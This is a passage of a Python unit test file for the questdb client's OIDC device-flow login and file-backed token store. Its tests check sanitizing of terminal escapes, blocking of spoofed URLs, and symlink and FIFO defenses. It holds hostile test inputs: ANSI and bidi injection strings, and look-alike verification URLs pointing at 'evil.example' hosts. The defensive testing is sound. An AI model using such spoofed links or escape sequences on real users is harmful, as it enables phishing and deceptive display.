        self.assertIn(
            'https://idp.example.com/device?user_code=WXYZ', with_complete)
        without = format_prompt({
            'user_code': 'WXYZ',
            'verification_uri': 'https://idp.example.com/device'})
        self.assertNotIn('or open directly', without)

    def test_oidc_error_sanitizes_message_and_fields(self):
        # OidcError strips control/bidi chars from its message centrally, so no
        # raise site can leak an ANSI/bidi sequence into an uncaught traceback (a
        # display sink the renderer never sees). The device-flow subclass strips
        # its untrusted error / error_description attributes too. See M2.
        e = OidcError('boom ' + chr(0x1b) + '[31m' + chr(0x202e)
                      + 'hidden' + chr(0x07) + ' done')
        self.assertEqual(str(e), 'boom [31mhidden done')
        self.assertEqual(OidcError('x', status=503).status, 503)  # status kept
        d = OidcDeviceFlowError(
            'failed ' + chr(0x1b) + '[2Jx',
            error='bad' + chr(0x1b) + ']0;t' + chr(0x07),
            error_description='why ' + chr(0x202e) + 'flip' + chr(0x1b) + '[0m')
        for s in (str(d), d.error, d.error_description):
            self.assertNotIn(chr(0x1b), s)
            self.assertNotIn(chr(0x07), s)
            self.assertNotIn(chr(0x202e), s)
        self.assertIn('flip', d.error_description)  # readable text survives
        # Absent error / error_description stay None (not coerced to '').
        d2 = OidcDeviceFlowError('x')
        self.assertIsNone(d2.error)
        self.assertIsNone(d2.error_description)

    def test_oidc_error_sanitizes_non_string_arg(self):
        # A non-string positional arg is coerced through str() and sanitized too,
        # so an object whose text representation embeds ANSI/bidi can't leak it
        # into a traceback. No raise site passes one today — defense-in-depth. M6.
        class _Evil:
            def __str__(self):
                return 'boom \x1b[31m' + chr(0x202e) + 'spoof\x07'

        e = OidcError(_Evil())
        self.assertNotIn('\x1b', str(e))
        self.assertNotIn('\x07', str(e))
        self.assertNotIn(chr(0x202e), str(e))
        self.assertIn('boom', str(e))
        self.assertIn('spoof', str(e))

    def test_oidc_device_flow_error_tolerates_non_string_fields(self):
        # M1: a hostile/non-conformant IdP can put a non-string into the
        # error / error_description of a token or device-auth response. Building
        # OidcDeviceFlowError from it must NOT raise a raw TypeError — that would
        # escape the typed-error contract and, on the refresh path, slip past the
        # 'except OidcError' fallback (the TypeError would be raised DURING the
        # exception's construction, so it isn't an OidcError). The field is
        # coerced through str() and sanitized, mirroring OidcError's args.
        for bad in ({'code': 'denied'}, 12345, ['a', 'bb'], True):
            e = OidcDeviceFlowError('failed', error=bad, error_description=bad)
            self.assertIsInstance(e, OidcError)
            self.assertIsInstance(e.error, str)
            self.assertIsInstance(e.error_description, str)

        # A non-string whose text representation embeds an ANSI/bidi sequence is
        # still stripped (same traceback-sink concern as OidcError's message).
        class _Evil:
            def __str__(self):
                return 'denied \x1b[31m' + chr(0x202e) + 'spoof'
        e = OidcDeviceFlowError('failed', error=_Evil(),
                                error_description=_Evil())
        for s in (e.error, e.error_description):
            self.assertNotIn('\x1b', s)
            self.assertNotIn(chr(0x202e), s)
            self.assertIn('spoof', s)
        # Absent stays None (not coerced to '' or 'None').
        self.assertIsNone(OidcDeviceFlowError('x').error)
        self.assertIsNone(OidcDeviceFlowError('x').error_description)

    def test_userinfo_verification_url_not_auto_opened(self):
        # M2: a tampered device response whose verification URL embeds userinfo
        # (https://trusted@evil/) must NOT be auto-opened in the browser — it
        # would navigate to `evil` while reading as `trusted`. The same
        # _safe_link_url gate that makes it inert in the notebook also blocks the
        # browser auto-open on a terminal.
        auth = OidcDeviceAuth(
            client_id='c',
            device_authorization_endpoint='https://idp.example.com/device',
            token_endpoint='https://idp.example.com/token',
            open_browser=True)
        with mock.patch('webbrowser.open') as wb, \
                mock.patch('questdb.auth._device.in_ipython_kernel',
                           return_value=False):
            auth._maybe_open_browser({
                'verification_uri':
                    'https://login.questdb.io@evil.example/device'})
            wb.assert_not_called()
            # A legitimate URL is still opened.
            auth._maybe_open_browser(
                {'verification_uri': 'https://idp.example.com/device'})
            wb.assert_called_once_with('https://idp.example.com/device')

    def test_homoglyph_host_revealed_not_clickable(self):
        # A homoglyph "dot" in the host — fullwidth U+FF0E / one-dot-leader
        # U+2024 / ideographic U+3002 — IDNA-folds to a real '.', so the true
        # registrable domain is evil.com, visually masquerading as a trusted
        # host. It must be (a) never clickable / opened (the host-allowlist
        # rejects a non-ASCII host) and (b) shown IDNA-normalized, not echoed
        # raw, so the real host is legible.
        from questdb.auth._render import (
            _safe_link_url, _safe_target, _display_url, _render_link)
        for cp in (0xFF0E, 0x2024, 0x3002):
            raw = f'https://idp.example.com{chr(cp)}evil.com/device'
            self.assertIsNone(_safe_link_url(raw), f'U+{cp:04X} clickable')
            self.assertIsNone(_safe_target(raw))
            shown = _display_url(raw)
            self.assertNotIn(chr(cp), shown)                  # not echoed raw
            self.assertIn('idp.example.com.evil.com', shown)  # real host shown
            link = _render_link(raw)
            self.assertNotIn('<a ', link)                     # inert, no link
            self.assertNotIn(chr(cp), link)
        # The @-userinfo trick is likewise revealed (real host shown, no '@').
        self.assertEqual(
            _display_url('https://login.questdb.io@evil.example/device'),
            'https://evil.example/device')
        # A legitimate URL is shown unchanged and stays clickable.
        self.assertEqual(_display_url('https://idp.example.com/device'),
                         'https://idp.example.com/device')
        self.assertIn('<a href="https://idp.example.com/device"',
                      _render_link('https://idp.example.com/device'))

    def test_display_url_normalizes_host_with_malformed_port(self):
        # m3: parts.port raises ValueError on a junk (non-integer) port. That
        # must NOT abort host normalization, or a homoglyph host paired with a
        # junk port would be shown raw -- the very spoof _display_url reveals. The
        # host is still IDNA/punycode-normalized; the unrenderable port is dropped.
        from questdb.auth._render import _display_url
        out = _display_url('https://аpple.com:bad/device')  # Cyrillic 'а'
        self.assertNotIn('а', out)     # homoglyph revealed, not echoed raw
        self.assertIn('xn--', out)          # shown in punycode
        self.assertIn('/device', out)       # path preserved

    def test_display_url_neutralizes_unparseable_confusable_host(self):
        # M2: a confusable that NFKC-folds to a URL delimiter (fullwidth solidus
        # U+FF0F -> '/', '@' U+FF20, '#' U+FF03, '?' U+FF1F) makes urlparse raise,
        # so the host can't be normalized. The fail-open path must NOT echo the
        # raw confusable (it would read as the trusted host 'login.questdb.io'
        # while a browser resolves 'evil.example' after the fold); it escapes the
        # non-ASCII to a visible \uXXXX, and the URL is never clickable / opened.
        from questdb.auth._render import _display_url, _safe_target, _render_link
        for cp in (0xFF0F, 0xFF20, 0xFF03, 0xFF1F):
            raw = f'https://login.questdb.io{chr(cp)}@evil.example/device'
            shown = _display_url(raw)
            self.assertNotIn(chr(cp), shown)            # confusable not echoed raw
            self.assertIn(f'\\u{cp:04x}', shown)        # made visible instead
            self.assertIn('evil.example', shown)        # real authority legible
            self.assertIsNone(_safe_target(raw))        # never clickable / opened
            self.assertNotIn('<a ', _render_link(raw))  # inert escaped text only

    def test_display_url_neutralizes_idna_backslash_fold(self):
        # A fullwidth reverse solidus U+FF3C (or small reverse solidus U+FE68)
        # does NOT make urlparse raise (unlike the solidus / '@' / '#' / '?'
        # confusables above), so it reaches the IDNA branch, where nameprep folds
        # it to a literal '\'. A WHATWG/browser parser treats '\' as '/', so the
        # displayed host would not be the one a browser resolves. It must be shown
        # as a visible \uXXXX escape -- never a bare backslash -- and never made
        # clickable / opened.
        from questdb.auth._render import _display_url, _safe_target, _render_link
        for cp in (0xFF3C, 0xFE68):
            raw = f'https://login.questdb.io{chr(cp)}.attacker.example/auth'
            shown = _display_url(raw)
            self.assertNotIn(chr(cp), shown)             # confusable not echoed raw
            self.assertIn(f'\\u{cp:04x}', shown)         # made visible instead
            self.assertNotIn('questdb.io\\.', shown)     # no bare 'io\.' path-split
            self.assertIn('attacker.example', shown)     # real authority legible
            self.assertIsNone(_safe_target(raw))         # never clickable / opened
            self.assertNotIn('<a ', _render_link(raw))   # inert escaped text only

    def test_displayed_and_opened_target_do_not_diverge(self):
        # A control / zero-width char stripped from the on-screen link must NOT
        # survive into the URL actually opened or QR-encoded: the display, the
        # browser target and both QR encoders all use one _strip_control'd,
        # vetted value (_safe_target), so they cannot diverge.
        from questdb.auth._render import _safe_target, _display_url
        zwsp = chr(0x200b)
        raw = f'https://idp.example.com/de{zwsp}vice'   # zero-width space in path
        clean = 'https://idp.example.com/device'
        self.assertEqual(_safe_target(raw), clean)
        self.assertEqual(_display_url(raw), clean)
        self.assertNotIn(zwsp, _safe_target(raw))
        # End-to-end: the browser opens the stripped target, not the raw value.
        auth = OidcDeviceAuth(
            client_id='c',
            device_authorization_endpoint='https://idp.example.com/device',
            token_endpoint='https://idp.example.com/token',
            open_browser=True)
        with mock.patch('webbrowser.open') as wb, \
                mock.patch('questdb.auth._device.in_ipython_kernel',
                           return_value=False):
            auth._maybe_open_browser({'verification_uri': raw})
            wb.assert_called_once_with(clean)

    def test_qr_helpers_degrade_without_qrcode(self):
        # The QR helpers must degrade gracefully (return None), never raise,
        # when `qrcode` is absent or the data is empty. See M4.
        from questdb.auth import _render
        with mock.patch.dict(sys.modules, {'qrcode': None}):
            self.assertIsNone(_render._qr_ascii('https://idp/x'))
            self.assertIsNone(_render._qr_data_uri('https://idp/x'))
        self.assertIsNone(_render._qr_ascii(''))
        self.assertIsNone(_render._qr_data_uri(''))

    def test_non_string_verification_uri_does_not_crash(self):
        # A hostile/buggy device response with a non-string verification_uri /
        # _complete (e.g. a JSON number or list) must not crash the renderer
        # with a raw TypeError/AttributeError before the prompt is shown; the
        # field is coerced away. See _verification_uri / _safe_link_url.
        import io
        from questdb.auth._render import (
            format_prompt, TerminalRenderer, JupyterRenderer)
        resp = {'user_code': 'WDJB-MJHT', 'verification_uri': 12345,
                'verification_uri_complete': ['not', 'a', 'str'],
                'expires_in': 600, 'interval': 5}
        self.assertIn('WDJB-MJHT', format_prompt(resp))         # plain-text path
        TerminalRenderer(stream=io.StringIO()).on_prompt(resp)  # must not raise
        captured = {}

        class _Cap(JupyterRenderer):
            def _display(self, html_str):
                captured['html'] = html_str

        _Cap().on_prompt(resp)                                  # must not raise
        self.assertNotIn('<a ', captured['html'])               # no link, non-str

    def test_terminal_renderer_on_waiting_shows_countdown(self):
        # The polling countdown is a display sink driven on every poll, yet no
        # other test invokes TerminalRenderer.on_waiting. Pin that it renders the
        # remaining time as MM:SS (via _fmt_mmss) so a regression in the terminal
        # countdown surfaces. 90s -> "1:30"; a sub-minute value zero-pads.
        from questdb.auth._render import TerminalRenderer
        buf = io.StringIO()
        r = TerminalRenderer(stream=buf)
        r.on_waiting(90.0)
        out = buf.getvalue()
        self.assertIn('1:30', out)
        self.assertIn('waiting', out.lower())
        buf.truncate(0)
        buf.seek(0)
        r.on_waiting(5.0)
        self.assertIn('0:05', buf.getvalue())


# A known cross-language hash vector: the lowercase-hex SHA-256 of the canonical
# identity string for this exact identity, computed independently from the frozen
# contract. The Java client MUST produce the same hash for the same identity, so
# both clients address one file. A change here is a breaking on-disk-format change.
_CONTRACT_KEY = TokenStoreKey(
    'questdb', 'https://idp.example.com:443/token',
    'https://idp.example.com:443/device', 'openid', None, False)
_CONTRACT_HASH = 'bb24451046d9646892338e3cd193581c782267fe1a7a444a57277a2d2a1c5fd8'


class TestFileTokenStore(unittest.TestCase):
    """The default file-backed store, exercised directly (no device flow)."""

    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.dir, ignore_errors=True)
        self.store = FileTokenStore.at(self.dir)
        self.key = TokenStoreKey(
            'questdb', 'https://idp:443/token', 'https://idp:443/device',
            'openid', None, False)

    def _pt(self, **kw):
        base = dict(access_token='AT', id_token='IT', refresh_token='RT',
                    expires_at=1_003_600.0, token_ttl=3600.0)
        base.update(kw)
        return PersistedToken(**base)

    def _file(self, key=None):
        return os.path.join(self.dir, (key or self.key).hash() + '.json')

    def test_round_trip(self):
        self.store.save(self.key, self._pt())
        got = self.store.load(self.key)
        self.assertEqual(
            (got.access_token, got.id_token, got.refresh_token),
            ('AT', 'IT', 'RT'))
        self.assertEqual(got.expires_at, 1_003_600.0)
        self.assertEqual(got.token_ttl, 3600.0)

    def test_non_bool_groups_in_token_round_trips(self):
        # m2 (store-side defense-in-depth): TokenStoreKey is public, so a direct
        # caller could pass a truthy non-bool groups_in_token. hash() buckets it
        # truthily ('1'/'0'), so save/load must agree — _serialize writes the
        # boolean and _parse_and_verify compares bool-to-bool — rather than the
        # raw value failing its own reload (`True != 2`). (OidcDeviceAuth also
        # coerces it; this guards the direct-key path.)
        key2 = TokenStoreKey(
            'questdb', 'https://idp:443/token', 'https://idp:443/device',
            'openid', None, 2)          # truthy non-bool
        self.store.save(key2, self._pt())
        self.assertIsNotNone(self.store.load(key2))
        # It buckets to the same file as a real bool-True key, and that key —
        # whose payload the fix wrote as a clean boolean — loads it too.
        key_true = TokenStoreKey(
            'questdb', 'https://idp:443/token', 'https://idp:443/device',
            'openid', None, True)
        self.assertEqual(key2.hash(), key_true.hash())
        self.assertIsNotNone(self.store.load(key_true))

    def test_missing_file_returns_none(self):
        self.assertIsNone(self.store.load(self.key))

    def test_hash_matches_cross_language_contract(self):
        # Freeze the on-disk file-name contract so the Java client and this one
        # address the same file. See _CONTRACT_HASH.
        self.assertEqual(_CONTRACT_KEY.hash(), _CONTRACT_HASH)
        self.assertEqual(len(self.key.hash()), 64)
        self.assertTrue(all(c in '0123456789abcdef' for c in self.key.hash()))

    def test_canonical_endpoint(self):
        # scheme/host lower-cased, port explicit, path defaulted to '/'.
        self.assertEqual(
            _canonical_endpoint('https://Idp.Example.com/as/token'),
            'https://idp.example.com:443/as/token')
        self.assertEqual(
            _canonical_endpoint('http://idp:9000'), 'http://idp:9000/')
        self.assertEqual(
            _canonical_endpoint('https://idp:443/x'), 'https://idp:443/x')
        # An IPv6 literal keeps its brackets, so the host:port boundary is
        # unambiguous and matches the bracketed form the Java client renders
        # (otherwise the two clients hash the same endpoint differently).
        self.assertEqual(
            _canonical_endpoint('https://[::1]:9000/token'),
            'https://[::1]:9000/token')
        self.assertEqual(
            _canonical_endpoint('https://[FE80::1]/token'),
            'https://[fe80::1]:443/token')

    @unittest.skipUnless(os.name == 'posix', 'POSIX permissions')
    def test_permissions_are_owner_only(self):
        self.store.save(self.key, self._pt())
        self.assertEqual(os.stat(self._file()).st_mode & 0o777, 0o600)
        self.assertEqual(os.stat(self.dir).st_mode & 0o777, 0o700)

    @unittest.skipUnless(os.name == 'posix', 'POSIX permissions')
    def test_preexisting_loose_dir_is_tightened(self):
        os.chmod(self.dir, 0o755)
        self.store.save(self.key, self._pt())
        self.assertEqual(os.stat(self.dir).st_mode & 0o777, 0o700)

    @unittest.skipUnless(hasattr(os, 'symlink'), 'symlink support')
    def test_symlinked_store_dir_is_refused(self):
        # m8: os.path.isdir and os.chmod both FOLLOW a symlink, so a symlink
        # planted at the store path (needs write access to the PARENT dir) would
        # route the plaintext token files to — and chmod — the link's target,
        # outside any directory we own; re-asserting 0700 would then tighten the
        # target, not the exposure. _ensure_directory detects the symlinked leaf
        # with lstat and refuses it, so save()/in_lock() raise (best-effort: the
        # device flow degrades to no persistence) rather than write a credential
        # through the link.
        target = os.path.join(self.dir, 'real_target')
        os.mkdir(target)
        link = os.path.join(self.dir, 'link_store')
        os.symlink(target, link)
        store = FileTokenStore.at(link)
        with self.assertRaises(OidcError):
            store.save(self.key, self._pt())
        self.assertEqual(os.listdir(target), [])  # nothing written through it
        # in_lock likewise refuses to run its action through the link.
        with self.assertRaises(OidcError):
            store.in_lock(self.key, lambda: 'unreachable')
        self.assertEqual(os.listdir(target), [])
        # Only the LEAF is checked: a symlinked PARENT (e.g. the whole store
        # relocated to another volume) is fine when the leaf itself is a real dir.
        inner = FileTokenStore.at(os.path.join(link, 'tokens'))
        inner.save(self.key, self._pt())
        self.assertIsNotNone(inner.load(self.key))
        self.assertIn('tokens', os.listdir(target))  # created under the real dir

    def test_is_stale_ignores_future_dated_lock(self):
        # m2: staleness rides the wall clock (st_mtime vs time.time()), which is
        # unavoidable for a cross-host lock. A FUTURE-dated mtime — our clock
        # stepped back, or a holder's clock runs ahead — gives a negative age we
        # cannot trust (the lock may be live), so _is_stale reads it as fresh and
        # does NOT steal, rather than break a live holder's lock.
        os.makedirs(self.dir, exist_ok=True)
        lock = os.path.join(self.dir, self.key.hash() + '.lock')
        open(lock, 'w').close()
        future = time.time() + 100_000
        os.utime(lock, (future, future))
        self.assertFalse(self.store._is_stale(lock))
        # Guard didn't over-broaden: a genuinely old lock past the window is still
        # stale.
        past = time.time() - 100_000
        os.utime(lock, (past, past))
        self.assertTrue(self.store._is_stale(lock))

    def test_atomic_write_leaves_no_tmp(self):
        self.store.save(self.key, self._pt())
        self.store.save(self.key, self._pt(refresh_token='RT2'))
        self.assertEqual(
            [n for n in os.listdir(self.dir) if n.endswith('.tmp')], [])
        self.assertEqual(self.store.load(self.key).refresh_token, 'RT2')

    def test_save_failure_leaves_no_tmp_and_raises(self):
        # A mid-write failure — at fdopen (fd never wrapped), fsync (fd wrapped),
        # or the atomic rename — must raise OidcError (persistence is best-effort;
        # OidcDeviceAuth then continues with the in-memory token) AND remove its
        # sibling temp file, so a crashed save never litters the store with a
        # torn/partial .tmp credential and never closes the fd twice. Exercises
        # the fd_owned / moved cleanup branches that a successful save can't.
        for point in ('fdopen', 'fsync', 'replace'):
            with self.subTest(point=point):
                with mock.patch(f'questdb.auth._store.os.{point}',
                                side_effect=OSError(errno.EIO, 'injected')):
                    with self.assertRaises(OidcError):
                        self.store.save(self.key, self._pt())
                leftover = [n for n in os.listdir(self.dir)
                            if n.endswith('.tmp')]
                self.assertEqual(leftover, [], f'{point}: temp file leaked')
                self.assertFalse(os.path.exists(self._file()),
                                 f'{point}: target created despite failure')

    def test_load_errno_routing(self):
        # load()'s os.stat can fail for different reasons. A path that is not a
        # usable regular file — a symlink loop (ELOOP) or a non-directory path
        # component (ENOTDIR) — is "no usable entry": return None and fall back to
        # a refresh / fresh sign-in. A genuine I/O or permission error (EACCES,
        # EIO) is NOT recoverable by re-prompting, so it must surface as OidcError
        # rather than be silently swallowed as "no token".
        self.store.save(self.key, self._pt())
        for err in (errno.ELOOP, errno.ENOTDIR):
            with mock.patch('questdb.auth._store.os.stat',
                            side_effect=OSError(err, os.strerror(err))):
                self.assertIsNone(self.store.load(self.key),
                                  f'errno {err} should read as no entry')
        for err in (errno.EACCES, errno.EIO):
            with mock.patch('questdb.auth._store.os.stat',
                            side_effect=OSError(err, os.strerror(err))):
                with self.assertRaises(OidcError):
                    self.store.load(self.key)

    def test_load_rejects_nonstring_audience_or_issuer_in_file(self):
        # The token file is attacker-writable. A non-string audience / issuer
        # (a JSON number/list from a hand-edited or hostile file) must never match
        # the live identity: _audience_matches / _issuer_matches demand an exact
        # string match (or both absent), so such a file is rejected (load -> None)
        # rather than served as though the identity lined up.
        for field in ('audience', 'issuer'):
            self.store.save(self.key, self._pt())
            with open(self._file()) as fh:
                obj = json.loads(fh.read())
            obj[field] = 12345  # non-string
            with open(self._file(), 'w') as fh:
                json.dump(obj, fh)
            self.assertIsNone(self.store.load(self.key),
                              f'non-string {field} should be rejected')

    def test_load_keeps_control_char_refresh_token(self):
        # Unlike the wire-bound access/id tokens (which OidcDeviceAuth screens with
        # _safe_token_or_none because they go onto an Authorization header / _sso
        # password, where a decoded CR/LF is an injection vector), the
        # refresh_token is only ever url-encoded into the IdP token request, never
        # a header — so the store loads it verbatim and the url-encoding at send
        # time neutralizes any control char. Pin that deliberate asymmetry: a
        # control char in the refresh_token is preserved, not silently dropped.
        self.store.save(self.key, self._pt(refresh_token='r\r\ntoken'))
        got = self.store.load(self.key)
        self.assertEqual(got.refresh_token, 'r\r\ntoken')

    def test_cross_process_save_load_round_trip(self):
        # The file store's raison d'etre is cross-PROCESS (and cross-language)
        # sharing — the rest of the suite exercises it only with threads in one
        # interpreter. Save in a CHILD process, load in this one, over a real
        # process boundary: proves the on-disk format a separate process writes is
        # readable here (the restart-resume path, and the Java-interop contract,
        # in miniature) rather than only within one address space.
        script = (
            'import sys\n'
            'from questdb.auth import ('
            'FileTokenStore, TokenStoreKey, PersistedToken)\n'
            'k = TokenStoreKey("questdb", "https://idp:443/token",\n'
            '    "https://idp:443/device", "openid", None, False)\n'
            'FileTokenStore.at(sys.argv[1]).save(k, PersistedToken(\n'
            '    access_token="AT", id_token="IT", refresh_token="XPROC-RT",\n'
            '    expires_at=1003600.0, token_ttl=3600.0))\n')
        import questdb  # parent already imported questdb.auth, so _client is loaded
        # Point the child at the questdb the PARENT resolved (whose compiled
        # _client extension is importable), not the whole sys.path. patch_path
        # appends the src/ source tree to sys.path; in a wheel test that tree has
        # no built _client, and copying all of sys.path into the child's
        # PYTHONPATH lets it shadow the installed package in the fresh
        # interpreter -- so `from questdb import _client` (run when the child
        # imports the questdb.auth subpackage) fails with a misleading circular-
        # import error. Prepending the resolved package root keeps the working
        # copy ahead of any un-built src/ tree.
        pkg_root = os.path.dirname(
            os.path.dirname(os.path.abspath(questdb.__file__)))
        env = dict(os.environ)
        env['PYTHONPATH'] = os.pathsep.join(
            [pkg_root] + [p for p in sys.path if p])
        res = subprocess.run(
            [sys.executable, '-c', script, self.dir],
            env=env, timeout=60, capture_output=True, text=True)
        self.assertEqual(res.returncode, 0,
                         f'child process failed: {res.stderr}')
        got = self.store.load(self.key)
        self.assertIsNotNone(
            got, 'a token saved by another process was not loadable here')
        self.assertEqual(got.refresh_token, 'XPROC-RT')
        self.assertEqual(got.access_token, 'AT')

    def test_oversized_file_ignored(self):
        with open(self._file(), 'wb') as fh:
            fh.write(b'{' + b' ' * (1 << 20))  # > _MAX_FILE_BYTES
        self.assertIsNone(self.store.load(self.key))

    def test_empty_file_ignored(self):
        open(self._file(), 'wb').close()
        self.assertIsNone(self.store.load(self.key))

    def test_garbage_file_ignored(self):
        with open(self._file(), 'w') as fh:
            fh.write('not json {{{')
        self.assertIsNone(self.store.load(self.key))

    def test_non_object_json_ignored(self):
        with open(self._file(), 'w') as fh:
            fh.write('[1, 2, 3]')
        self.assertIsNone(self.store.load(self.key))

    def test_directory_at_token_path_ignored(self):
        # A directory (or other non-regular file) planted at the token-file path
        # -- e.g. by a hostile co-tenant with write access to the store dir -- is
        # not a usable entry. load() must return None (fall back to a fresh
        # sign-in), not raise IsADirectoryError out of its documented contract.
        os.mkdir(self._file())
        self.assertIsNone(self.store.load(self.key))

    @unittest.skipUnless(hasattr(os, 'mkfifo'), 'FIFO support')
    def test_fifo_at_token_path_ignored(self):
        # m8: a non-regular file other than a directory — e.g. a FIFO — planted
        # at the token path is likewise not a usable entry (the S_ISREG guard
        # covers every non-regular type). load() must return None; because it
        # stats before opening, it never blocks reading the FIFO.
        os.mkfifo(self._file())
        self.assertIsNone(self.store.load(self.key))

    @unittest.skipUnless(
        hasattr(os, 'mkfifo') and os.name == 'posix', 'FIFO support')
    def test_fifo_swapped_in_after_stat_does_not_hang(self):
        # TOCTOU: the S_ISREG/size guards run on load()'s INITIAL os.stat, but a
        # hostile co-tenant with write access to the store dir could swap the
        # regular file for a FIFO between that stat and the open. A blocking
        # open() of a FIFO hangs forever waiting for a writer, pinning the calling
        # thread (which may hold the acquisition lock). Simulate the swap by
        # making the initial stat report a plausible REGULAR file while the real
        # path is a FIFO: load() must open O_NONBLOCK and reject it via the fstat
        # re-check on the opened fd, returning None promptly rather than hanging.
        os.mkfifo(self._file())
        fake_reg = os.stat_result((
            stat.S_IFREG | 0o600, 0, 0, 1, os.getuid(), os.getgid(),
            64, 0, 0, 0))
        result = {}

        def run():
            # Patch only os.stat (not os.fstat), so the initial guard sees a
            # regular file while the fd-based re-check sees the real FIFO.
            with mock.patch('questdb.auth._store.os.stat',
                            return_value=fake_reg):
                result['r'] = self.store.load(self.key)

        t = threading.Thread(target=run, daemon=True)
        t.start()
        t.join(timeout=10)
        self.assertFalse(
            t.is_alive(), 'load() hung on a FIFO swapped in after the stat')
        self.assertIsNone(result['r'])

    def test_deeply_nested_json_file_ignored(self):
        # The token file is attacker-writable. A deeply-nested JSON document
        # (well under the size cap) makes json.loads raise RecursionError, which
        # is not a ValueError; load() must still return None rather than let it
        # escape the documented "unreadable entry -> None" contract.
        depth = 60_000
        with open(self._file(), 'w') as fh:
            fh.write('[' * depth + ']' * depth)
        self.assertLess(os.path.getsize(self._file()), 1 << 20)  # under the cap
        self.assertIsNone(self.store.load(self.key))

    def test_wrong_schema_version_ignored(self):
        with open(self._file(), 'w') as fh:
            json.dump({'v': 2, 'client_id': 'questdb',
                       'token_endpoint': 'https://idp:443/token',
                       'device_authorization_endpoint':
                           'https://idp:443/device',
                       'scope': 'openid', 'groups_in_token': False,
                       'refresh_token': 'RT'}, fh)
        self.assertIsNone(self.store.load(self.key))

    def test_fingerprint_mismatch_ignored(self):
        # A file copied/renamed to a different identity's name still carries the
        # original fingerprint; the in-file re-check rejects it (defence in depth
        # against a hash collision), independent of the file-name hash.
        other = TokenStoreKey(
            'other', 'https://idp:443/token', 'https://idp:443/device',
            'openid', None, False)
        self.store.save(self.key, self._pt())
        shutil.copy(self._file(self.key), self._file(other))
        self.assertIsNone(self.store.load(other))

    def test_audience_null_omitted_and_literal_null_roundtrips(self):
        # A None audience is omitted (not written as JSON null), and a token that
        # is literally the string "null" round-trips verbatim.
        self.store.save(self.key, self._pt(refresh_token='null'))
        with open(self._file()) as fh:
            raw = fh.read()
        self.assertNotIn('"audience"', raw)
        self.assertEqual(self.store.load(self.key).refresh_token, 'null')

    def test_audience_in_fingerprint_roundtrips(self):
        key = TokenStoreKey(
            'questdb', 'https://idp:443/token', 'https://idp:443/device',
            'openid', 'api://billing', False)
        self.store.save(key, self._pt())
        with open(self._file(key)) as fh:
            self.assertIn('"audience"', fh.read())
        self.assertIsNotNone(self.store.load(key))
        # A different audience is a different identity (different file).
        other = TokenStoreKey(
            'questdb', 'https://idp:443/token', 'https://idp:443/device',
            'openid', 'api://other', False)
        self.assertIsNone(self.store.load(other))

    def test_issuer_in_fingerprint_not_hash(self):
        # M1: issuer participates in the on-load identity re-check but NOT the
        # file-name hash, so two issuer-differing configs address the SAME file
        # yet never adopt each other's token. (Contrast audience above, which IS
        # in the hash, so a different audience is a different FILE.) This is the
        # on-disk half of the issuer isolation the in-memory cache_key enforces.
        key_x = TokenStoreKey(
            'questdb', 'https://idp:443/token', 'https://idp:443/device',
            'openid', None, False, issuer='https://idp/realms/x')
        key_y = TokenStoreKey(
            'questdb', 'https://idp:443/token', 'https://idp:443/device',
            'openid', None, False, issuer='https://idp/realms/y')
        # Same file name (issuer excluded from the hash), incl. the no-issuer key.
        self.assertEqual(key_x.hash(), key_y.hash())
        self.assertEqual(key_x.hash(), self.key.hash())
        self.store.save(key_x, self._pt())
        with open(self._file(key_x)) as fh:
            self.assertIn('"issuer"', fh.read())
        self.assertIsNotNone(self.store.load(key_x))   # same issuer: served
        self.assertIsNone(self.store.load(key_y))      # other issuer: rejected
        self.assertIsNone(self.store.load(self.key))   # un-pinned: rejected
        # An un-pinned token is likewise not served to a pinned session.
        self.store.save(self.key, self._pt())          # overwrite, no issuer field
        with open(self._file(self.key)) as fh:
            self.assertNotIn('"issuer"', fh.read())
        self.assertIsNone(self.store.load(key_x))

    def test_absent_token_fields_read_back_as_none(self):
        self.store.save(self.key, self._pt(access_token=None, id_token=None))
        got = self.store.load(self.key)
        self.assertIsNone(got.access_token)
        self.assertIsNone(got.id_token)
        self.assertEqual(got.refresh_token, 'RT')

    def test_clear_removes_file_and_is_idempotent(self):
        self.store.save(self.key, self._pt())
        self.store.clear(self.key)
        self.assertIsNone(self.store.load(self.key))
        self.store.clear(self.key)  # no-op, must not raise

    def test_constructor_validates_args(self):
        with self.assertRaises(OidcConfigError):
            FileTokenStore('')
        with self.assertRaises(OidcConfigError):
            FileTokenStore(self.dir, lock_acquire_budget=0)
        with self.assertRaises(OidcConfigError):
            FileTokenStore(self.dir, lock_stale=-1)
        # lock_stale must EXCEED the worst-case live hold, not merely be
        # positive: a tiny window would let a peer steal a LIVE holder's lock
        # mid-refresh. A positive-but-too-small value, and the boundary itself,
        # are rejected; a value above the floor is accepted.
        with self.assertRaises(OidcConfigError):
            FileTokenStore(self.dir, lock_stale=1)
        with self.assertRaises(OidcConfigError):
            FileTokenStore(self.dir, lock_stale=_MIN_LOCK_STALE)
        FileTokenStore(self.dir, lock_stale=_MIN_LOCK_STALE + 1)  # ok
        # Non-finite timings slip the bare `> 0` / `> _MIN_LOCK_STALE` comparisons
        # (inf > x is True) — and an infinite stale window means a crashed
        # holder's lock is never reclaimed — so they must be rejected too.
        with self.assertRaises(OidcConfigError):
            FileTokenStore(self.dir, lock_acquire_budget=float('inf'))
        with self.assertRaises(OidcConfigError):
            FileTokenStore(self.dir, lock_stale=float('inf'))

    def test_at_default_location_honours_env(self):
        with mock.patch.dict(os.environ, {TOKEN_STORE_DIR_ENV: self.dir}):
            store = FileTokenStore.at_default_location()
        store.save(self.key, self._pt())
        self.assertTrue(os.path.exists(self._file()))

    def test_at_default_location_unresolvable_home_raises(self):
        # With no env override and no resolvable home (HOME/USERPROFILE unset and
        # no passwd entry, e.g. a distroless container), expanduser('~') returns
        # the literal '~'. Joining onto it would create a surprise RELATIVE '~'
        # directory under cwd, so fail clearly and point at the env override.
        env = {k: v for k, v in os.environ.items() if k != TOKEN_STORE_DIR_ENV}
        with mock.patch.dict(os.environ, env, clear=True), \
                mock.patch('os.path.expanduser', return_value='~'):
            with self.assertRaises(OidcConfigError) as cm:
                FileTokenStore.at_default_location()
        self.assertIn(TOKEN_STORE_DIR_ENV, str(cm.exception))

    def test_repr_hides_secrets(self):
        text = repr(self._pt(access_token='SECRET-AT', refresh_token='SECRET-RT'))
        self.assertNotIn('SECRET-AT', text)
        self.assertNotIn('SECRET-RT', text)

    def test_in_lock_runs_action_and_releases(self):
        lock = os.path.join(self.dir, self.key.hash() + '.lock')
        seen = {}

        def action():
            seen['held'] = os.path.exists(lock)
            return 'result'

